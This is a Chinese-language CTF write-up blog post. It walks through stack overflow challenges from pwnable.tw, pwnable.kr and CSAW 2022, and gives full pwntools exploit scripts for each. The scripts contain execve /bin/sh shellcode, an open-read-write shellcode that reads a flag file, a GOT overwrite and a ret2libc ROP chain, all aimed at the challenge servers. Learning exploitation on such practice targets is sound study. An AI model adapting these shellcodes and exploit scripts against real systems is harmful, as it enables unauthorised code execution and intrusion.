---
title: 「Pwnable」Stack based BOF challenge I did recently
toc: true
mathjax: true
date: 2022-09-06 19:45:54
tags: Pwnable
categories: TECHNOLOGY
---

## Pwnable.TW - start

### First Look

查看一下开了什么保护：

```plaintext
[*] '/home/track/Binary/Pwnable/TW/start/start'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
```

IDA 分析一下程序流程：

```plaintext
.text:08048060 ; __int64 start()
.text:08048060                 public _start
.text:08048060 _start          proc near               ; DATA XREF: LOAD:08048018↑o
.text:08048060                 push    esp
.text:08048061                 push    offset _exit
.text:08048066                 xor     eax, eax
.text:08048068                 xor     ebx, ebx
.text:0804806A                 xor     ecx, ecx
.text:0804806C                 xor     edx, edx
.text:0804806E                 push    3A465443h
.text:08048073                 push    20656874h
.text:08048078                 push    20747261h
.text:0804807D                 push    74732073h
.text:08048082                 push    2774654Ch
.text:08048087                 mov     ecx, esp        ; addr
.text:08048089                 mov     dl, 14h         ; len
.text:0804808B                 mov     bl, 1           ; fd
.text:0804808D                 mov     al, 4
.text:0804808F                 int     80h             ; LINUX - sys_write
.text:0804808F
.text:08048091                 xor     ebx, ebx
.text:08048093                 mov     dl, 3Ch ; '<'
.text:08048095                 mov     al, 3
.text:08048097                 int     80h             ; LINUX -
.text:08048097
.text:08048099                 add     esp, 14h
.text:0804809C                 retn
```

man syscall 看一下 i386 arch 的 syscall ABI:

```plaintext
       Arch/ABI      arg1  arg2  arg3  arg4  arg5  arg6  arg7  Notes
       ──────────────────────────────────────────────────────────────
       i386          ebx   ecx   edx   esi   edi   ebp   -
```

以及调用约定：

```plaintext
       Arch/ABI    Instruction           System  Ret  Ret  Error    Notes
                                         call #  val  val2
       ───────────────────────────────────────────────────────────────────
       i386        int $0x80             eax     eax  edx  -
```

一次 write 在 stdout 打印栈上字符串，一次 read 从 stdin 读 0x3c 个字节到栈上，之后将 esp 抬高 0x14 个字节后到达 retn addr 返回。

### Bug

可以有一次栈溢出的机会，结合保护全关，我们直接在栈上写 shellcode 即可。这种时候我们一般会选择找一条 `jmp esp` 的 gadget，这题显然是没有的。只能转而泄露栈上地址，这就需要两次溢出。简单调试一下看看栈上的情况：

```plaintext
pwndbg> 
0x08048087 in _start ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────
 EAX  0x0
 EBX  0x0
 ECX  0x0
 EDX  0x0
 EDI  0x0
 ESI  0x0
 EBP  0x0
*ESP  0xffffc2a4 ◂— 0x2774654c ("Let'")
*EIP  0x8048087 (_start+39) ◂— mov    ecx, esp
────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────
   0x804806e <_start+14>    push   0x3a465443
   0x8048073 <_start+19>    push   0x20656874
   0x8048078 <_start+24>    push   0x20747261
   0x804807d <_start+29>    push   0x74732073
   0x8048082 <_start+34>    push   0x2774654c
 ► 0x8048087 <_start+39>    mov    ecx, esp
   0x8048089 <_start+41>    mov    dl, 0x14
   0x804808b <_start+43>    mov    bl, 1
   0x804808d <_start+45>    mov    al, 4
   0x804808f <_start+47>    int    0x80
   0x8048091 <_start+49>    xor    ebx, ebx
─────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────
00:0000│ esp 0xffffc2a4 ◂— 0x2774654c ("Let'")
01:0004│     0xffffc2a8 ◂— 0x74732073 ('s st')
02:0008│     0xffffc2ac ◂— 0x20747261 ('art ')
03:000c│     0xffffc2b0 ◂— 0x20656874 ('the ')
04:0010│     0xffffc2b4 ◂— 0x3a465443 ('CTF:')
05:0014│     0xffffc2b8 —▸ 0x804809d (_exit) ◂— pop    esp
06:0018│     0xffffc2bc —▸ 0xffffc2c0 ◂— 0x1        ; God bless you
```

发现由于开头的 `push esp` 栈上会存着一个 old esp 的地址，只需要溢出控制返回到调用 write 写地址的部分即可。所以第一部分 payload 构造：

```python
write_gadget = 0x8048087
payload = flat([
    b'a' * 20,
    p32(write_gadget)
])
```

打印的前四字节就是 old esp 的地址，后续再溢出一次写 shellcode 即可。我选择的 shellcode: 

```x86asm
xor    %eax,%eax
push   %eax
push   $0x68732f2f
push   $0x6e69622f
mov    %esp,%ebx
mov    %eax,%ecx
mov    %eax,%edx
mov    $0xb,%al
int    $0x80
xor    %eax,%eax
inc    %eax
int    $0x80
```

### EXP

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

context(
    arch = 'i386',
    os = 'linux',
    log_level = 'debug',
    terminal = ['tmux', 'splitw', '-h']
)

s = lambda data : p.send(data)
sa = lambda delim, data : p.sendafter(delim, data)
sl = lambda data : p.sendline(data)
sla = lambda delim, data : p.sendlineafter(delim, data)
r = lambda numb=4096, timeout=2 : p.recv(numb, timeout=timeout)
ru = lambda delims, drop=True : p.recvuntil(delims, drop)
irt = lambda : p.interactive()
dbg = lambda gs='', **kwargs : gdb.attach(proc.pidof(p)[0], gdbscript=gs, **kwargs)

uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
leak = lambda name, addr : log.success('{} = {:#x}'.format(name, addr))

def leak_esp(p):
    write_gadget = 0x8048087
    payload = flat([
        b'a' * 20,
        p32(write_gadget)
    ])
    sa(b'Let\'s start the CTF:', payload)
    saved_esp = r()[:4]
    return uu32(saved_esp)

def exp(p, esp):
    print(esp)
    shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
    payload = flat([
        b'a' * 20,
        p32(esp + 20),
        shellcode
    ])
    p.send(payload)
    irt()

ISDEBUG = False

if ISDEBUG:
    p = process('./start')
    # dbg('b *0x8048087')
    # pause()
else:
    p = remote('chall.pwnable.tw', 10000)

saved_esp = leak_esp(p)
exp(p, saved_esp)
irt()
```

## Pwnable.TW - orw

单纯地让你给一段 shellcode, seccomp-tools 发现禁掉了一些 syscalls:

```python
Pwnable/TW/orw 
[I] ➜ seccomp-tools dump ./orw                              
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011
 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011
 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011
 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011
 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011
 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011
 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011
 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

写一段 orw 的 shellcode 就好了

### EXP

注意入栈顺序即可：

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

ISDEBUG = False
if ISDEBUG:
    p = process('./orw')
else:
    p = remote('chall.pwnable.tw', 10001)

context(
    arch = 'i386',
    os = 'linux',
    log_level = 'debug',
    terminal = ['tmux', 'splitw', '-h']
)

s = lambda data : p.send(data)
sa = lambda delim, data : p.sendafter(delim, data)
sl = lambda data : p.sendline(data)
sla = lambda delim, data : p.sendlineafter(delim, data)
r = lambda numb=4096, timeout=2 : p.recv(numb, timeout=timeout)
ru = lambda delims, drop=True : p.recvuntil(delims, drop)
irt = lambda : p.interactive()
dbg = lambda gs='', **kwargs : gdb.attach(p, gdbscript=gs, **kwargs)

uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
leak = lambda name, addr : log.success('{} = {:#x}'.format(name, addr))

# orw flag in `/home/orw/flag`
# open(flag, 0)
# read(fd, stack, size)
# write(1, stack, size)
shellcode = '''
xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx
push 0x00006761
push 0x6c662f77
push 0x726f2f65
push 0x6d6f682f
mov ebx, esp
mov eax, 5
int 0x80
mov ebx, eax
mov ecx, esp
mov edx, 0x30
mov eax, 3
int 0x80
mov edx, 0x30
mov ecx, esp
mov ebx, 1
mov eax, 4
int 0x80
'''

# dbg('b *0x804858A\n')

shellcode_bytes = asm(shellcode)
print(shellcode_bytes)

sla(b'Give my your shellcode:', shellcode_bytes)

irt()
```

## Pwnable.KR - passcode

### TL;DR

欢迎之后登录，要求两个栈上变量等于要求的值。漏洞出在如下代码：

```c
  __isoc99_scanf("%d", v1);
  fflush(stdin);
  printf("enter passcode2 : ");
  __isoc99_scanf("%d", v2);
```

有两个任意地址写。再返回去看看 welcome 函数发现有一个 100 字节的输入，看似没有什么问题但实际上调试一下发现可以在 welcome 的栈帧溢出覆盖到 login 栈上的变量，然后写 fflush 的 got 表到 system 函数上即可。

### EXP

跨函数栈帧的溢出达到任意地址写

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

context(
    arch = 'i386',
    os = 'linux',
    log_level = 'debug',
    terminal = ['tmux', 'splitw', '-h']
)

s = lambda data : p.send(data)
sa = lambda delim, data : p.sendafter(delim, data)
sl = lambda data : p.sendline(data)
sla = lambda delim, data : p.sendlineafter(delim, data)
r = lambda numb=4096, timeout=2 : p.recv(numb, timeout=timeout)
ru = lambda delims, drop=True : p.recvuntil(delims, drop)
irt = lambda : p.interactive()
dbg = lambda gs='', **kwargs : gdb.attach(p, gdbscript=gs, **kwargs)

uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
leak = lambda name, addr : log.success('{} = {:#x}'.format(name, addr))

ISDEBUG = True

if ISDEBUG:
    p = process('./passcode')
    # dbg()
else:
    # ssh passcode@pwnable.kr -p2222 (pw:guest)
    session = ssh(host='pwnable.kr',user='passcode', port=2222,password='guest')
    p = session.process(executable='./passcode')

fflush = 0x804a004
syscommand = 0x080485e3
log.success(f"\033[0;91msyscommand: {str(syscommand).encode()}\033[0m")
pl = flat([
    b'a' * 96, # welcome frame overwrite login frame
    p32(fflush), # overwrite passcode1 addr
    str(syscommand).encode('ascii') # plt['fflush'] = system
])

print(r())
sl(pl)
print(p.recvall())
irt()
```

## CSAWCTF2022 - ezROP

### TL;DR

IDA 看一下关键的 vuln 函数：

```c
void __fastcall vul(void *arr)
{
  __int64 v1; // rax
  __int64 v2; // rax
  __int64 v3; // rax
  __int64 v4; // rax
  __int64 v5; // rax
  __int64 v6; // rax
  __int64 v7; // rax
  __int64 v8; // rax
  __int64 v9; // rax
  __int64 v10; // rax
  __int64 v11; // rax
  __int64 v12; // rax
  __int64 v13; // rax
  size_t rop[257]; // [rsp+10h] [rbp-820h] BYREF
  __int64 cnt; // [rsp+818h] [rbp-18h]
  size_t rsi_gadget; // [rsp+820h] [rbp-10h]
  size_t rdi_gadget; // [rsp+828h] [rbp-8h]
  size_t *vars0; // [rsp+830h] [rbp+0h]

  rdi_gadget = 0x4015A3LL;
  rsi_gadget = 0x4015A1LL;
  cnt = 0LL;
  memset(rop, 0, 0x800uLL);
  v1 = cnt++;
  rop[v1] = (size_t)arr + 0x70;                 // old rbp
  v2 = cnt++;
  rop[v2] = rdi_gadget;                         // pop rdi; retn
  v3 = cnt++;
  rop[v3] = (size_t)str1;                       // My friend ...
  v4 = cnt++;
  rop[v4] = (size_t)&puts;                      // puts func
  v5 = cnt++;
  rop[v5] = rsi_gadget;                         // pop rsi; pop r15; retn
  v6 = cnt++;
  rop[v6] = 256LL;                              // rsi
  v7 = cnt++;
  rop[v7] = 0x999LL;                            // r15
  v8 = cnt++;
  rop[v8] = rdi_gadget;                         // pop rdi; retn
  v9 = cnt++;
  rop[v9] = (size_t)arr;                        // arr
  v10 = cnt++;
  rop[v10] = (size_t)readn;                     // readn(arr, 0x100)
  v11 = cnt++;
  rop[v11] = rdi_gadget;                        // pop rdi; retn
  v12 = cnt++;
  rop[v12] = (size_t)arr;                       // arr
  v13 = cnt++;
  rop[v13] = (size_t)check;                     // check func
  rop[cnt] = (size_t)&loc_40152D;               // main return
  vars0 = rop;
}
```

发现作者使用 rop 和栈迁移技术执行了自己在 vuln 中布置的 rop chain. 稍微调试一下就可以发现 readn 有一个 0x30 字节的栈溢出，使用 __ctype_b_loc 限制了输入，但是可以简单地使用 \x00 绕过

### EXP

打 ret2libc:

* ROP call puts 打印出 puts 的 got
* leak 出地址之后再返回到 main 溢出一次
* build docker 测一下偏移，调用 system("/bin/sh")

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

bin_path = './ezROP'
ISDEBUG = False
if ISDEBUG:
    p = process(bin_path)

else:
    p = remote('pwn.chal.csaw.io', 5002)

elf  = ELF(bin_path)

context(
    arch = 'amd64',
    os = 'linux',
    log_level = 'debug',
    terminal = ['tmux', 'splitw', '-h']
)

# gdb.attach(p, 'b main')
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']
pop_rdi_retn = 0x4015a3
retn_gadget = 0x000000000040117f

payload = flat([
    b'\x00',
    b'a' * 0x6f,
    b'b' * 8,
    p64(pop_rdi_retn),
    p64(puts_got),
    p64(puts_plt),
    p64(main_addr)
])

p.sendlineafter(b'name?\n', payload)
p.recvuntil(b'Welcome to CSAW\'22!\n')
puts_addr = u64(p.recv()[:6].ljust(8, b'\x00'))

print(hex(puts_addr))

system_addr = puts_addr - 205200
binsh_addr = puts_addr + 1245597

payload = flat([
    b'\x00',
    b'a' * 0x6f,
    b'b' * 8,
    p64(retn_gadget),
    p64(pop_rdi_retn),
    p64(binsh_addr),
    p64(system_addr)
])
p.sendline(payload)
p.interactive()
```

## CSAWCTF2022 - how2pwn

### TL;DR
有意思的 shellcode 挑战。

## TODO

- [x] csaw how2pwn

- [x] tw calc
